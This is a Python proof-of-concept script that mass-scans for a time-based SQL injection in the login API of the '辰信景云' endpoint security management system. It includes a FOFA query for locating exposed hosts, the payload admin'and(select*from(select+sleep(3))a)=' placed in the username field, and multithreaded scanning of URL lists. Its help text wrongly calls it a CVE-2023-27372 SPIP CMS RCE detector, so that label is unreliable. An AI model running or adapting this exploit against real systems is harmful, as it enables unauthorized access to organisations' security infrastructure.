#FOFA:"辰信景云终端安全管理系统" && icon_hash="-429260979"

import requests
import re
import argparse
import urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    try:
        payload1 = "/?v=login"
        res1 = requests.get(target+payload1,verify=False)
        if res1.status_code == 200:
            payload2 = "/api/user/login"
            data1 = {"captcha":"","password":"21232f297a57a5a743894a0e4a801fc3","username":"admin'and(select*from(select+sleep(3))a)='"}
            data2 = {"captcha":"","password":"123","username":"admin"}
            headers = {
                "Cookie": "vsecureSessionID=b487354c95bd812b8549c18d2f7ef1b5",
                "Content-Length": "102",
                "Sec-Ch-Ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "X-Requested-With": "XMLHttpRequest",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://106.55.100.76",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://106.55.100.76/?v=login",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5",
                "Priority": "u=1, i"
            }
            res2 = requests.post(target+payload2,data=data1,headers=headers,verify=False)
            res3 = requests.post(target+payload2,data=data2,headers=headers,verify=False)
            if res2.elapsed.total_seconds() > res3.elapsed.total_seconds() and res2.elapsed.total_seconds() > 3:
                print(f"{target}存在SQL注入漏洞")
            else:
                print(f"{target}不存在SQL注入漏洞")
    except Exception as e:
        print(f"{target}网站访问失败，请手动确认")


def main():
    parser = argparse.ArgumentParser("CVE-2023-27372 SPIP CMS远程代码执行漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()